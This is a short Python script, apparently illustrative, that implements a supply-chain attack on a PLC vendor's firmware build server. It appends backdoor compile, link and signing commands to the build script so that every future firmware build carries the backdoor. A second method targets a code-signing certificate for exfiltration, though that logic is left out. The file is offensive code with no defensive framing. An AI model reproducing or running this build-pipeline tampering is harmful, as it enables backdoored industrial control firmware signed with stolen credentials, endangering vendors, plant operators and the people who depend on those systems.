# supply_chain_attack.py - Inject backdoor during manufacturing
# Scenario: Attacker compromises PLC vendor's build server

class SupplyChainInjection:
    def __init__(self, build_server):
        self.server = build_server

    def compromise_build_pipeline(self):
        """
        Modify automated build process to inject backdoor
        into all manufactured units
        """
        # Locate firmware build script
        build_script = "/opt/plc_build/create_firmware.sh"

        # Inject backdoor compilation step
        backdoor_injection = """
# Compile backdoor module
gcc -c backdoor.c -o backdoor.o

# Link into firmware
ld -r firmware.o backdoor.o -o firmware_final.o

# Sign with stolen code-signing certificate
sign_firmware firmware_final.bin
"""

        # Append to build script
        with open(build_script, 'a') as f:
            f.write(backdoor_injection)

        print("[+] Build pipeline compromised")
        print("[+] All future firmware builds will include backdoor")

    def steal_signing_certificate(self):
        """
        Exfiltrate code-signing certificate from build server
        Allows signing backdoored firmware as legitimate
        """
        cert_path = "/opt/plc_build/certs/codesign.pfx"
        # ... exfiltration logic
